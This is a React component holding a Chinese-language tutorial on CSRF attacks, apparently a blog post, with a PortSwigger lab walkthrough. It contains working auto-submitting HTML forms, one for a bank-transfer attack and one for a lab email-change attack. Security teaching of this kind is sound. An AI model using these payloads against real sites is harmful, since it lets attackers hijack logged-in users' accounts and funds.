import X from 'src/component/X';

export default function Post() {
    return (
        <>
            <X.H1>概念与威胁模型</X.H1>
            <X.P>
                *跨站请求伪造*`(Cross-site Request Forgery,
                CSRF)`是一种冒充受信任用户，向服务器发送非预期请求的攻击方式。CSRF主要利用浏览器会自动携带cookie的特性。
            </X.P>
            <X.Image src="csrf.jpg" width="600px" filterDarkTheme />
            <X.Oli>用户登录网站，例如银行网站；</X.Oli>
            <X.Oli>网站返回cookie用于验证身份；</X.Oli>
            <X.Oli>
                <X.P>假设银行转账的请求形式是：</X.P>
                <X.CodeBlock
                    language="text"
                    code="http://www.mybank.com/transfer?to=[SomeAccount]&amount=[SomeAmount]"
                />
                <X.P>攻击者如果知道此形式（这是容易的），就可以构造一个恶意站点，这个站点会发送请求：</X.P>
                <X.CodeBlock language="text" code="http://www.mybank.com/transfer?to=attacker&amount=1000" />
            </X.Oli>
            <X.Oli>用户访问恶意站点时，触发了这个请求；</X.Oli>
            <X.Oli>
                由于用户经过登录后存有用于验证身份的cookie，服务器会认为请求是有效的，因而导致了非预期操作的发生。
            </X.Oli>
            <X.P>恶意站点构造可能如下：</X.P>
            <X.CodeBlock
                language="html"
                code={`
                <html>
                    <body>
                        <form action="https://www.mybank.com/transfer" method="POST">
                            <input type="hidden" name="to" value="attacker" />
                            <input type="hidden" name="amount" value="1000" />
                        </form>
                        <script>
                            document.forms[0].submit();
                        </script>
                    </body>
                </html>
                `}
            />
            <X.P>
                当用户访问这个页面时，`POST`请求会被触发；如果用户登录了`www.mybank.com`，请求时会自动带上cookie；`www.mybank.com`认为这是用户的请求，因而将其作为正常请求处理。
            </X.P>
            <X.H1>练习</X.H1>
            <X.P>
                下文给出的PortSwigger靶场中有关CSRF的Lab目标是构造一个恶意站点，更改访问它的用户的邮箱地址。\n攻击者可以通过账号`wiener:peter`了解网络请求结构。
            </X.P>
            <X.P>
                @PortSwigger Lab: CSRF vulnerability with no
                defenses[https://portswigger.net/web-security/csrf/lab-no-defenses]@
            </X.P>
            <X.P>
                攻击者有一个`exploit-server`服务器（如下图），其中的`/exploit`页面发送给受害用户访问，Lab的目标是编写`/exploit`页面，让访问到的用户的邮箱地址被更改。
            </X.P>
            <X.Image src="env.jpg" width="100%" />
            <X.Oli reset>
                登录账号`wiener:peter`，使用更新邮箱功能，观察网络请求，发现请求的接口是`/my-account/change-email`，并携带参数`email`：
            </X.Oli>
            <X.Image src="1-1.jpg" width="100%" />
            <X.P>根据上述发现，构造一个立即提交的表单请求，`action`为有漏洞网站的地址：</X.P>
            <X.CodeBlock
                language="html"
                code={`
                <form action="https://0a7f00ed032da08580297635009a00f7.web-security-academy.net/my-account/change-email" method="post">
                    <input type="hidden" name="email" value="abcd@abcd.com"/>
                </form>
                <script>
                    document.forms[0].submit();
                </script>
                `}
            />
            <X.Oli>提交通过。</X.Oli>
            <X.Image src="1-2.jpg" width="100%" />
            <X.H1>参考资料</X.H1>
            <X.P>本文的插图和例子来源于：</X.P>
            <X.Uli>
                @Cross site request forgery (CSRF)
                attack[https://medium.com/@rajeevranjancom/cross-site-request-forgery-csrf-attack-6949edb9e405]@
            </X.Uli>
            <X.Uli>
                @Portswigger - What is CSRF (Cross-site request forgery)?[https://portswigger.net/web-security/csrf]@
            </X.Uli>
        </>
    );
}
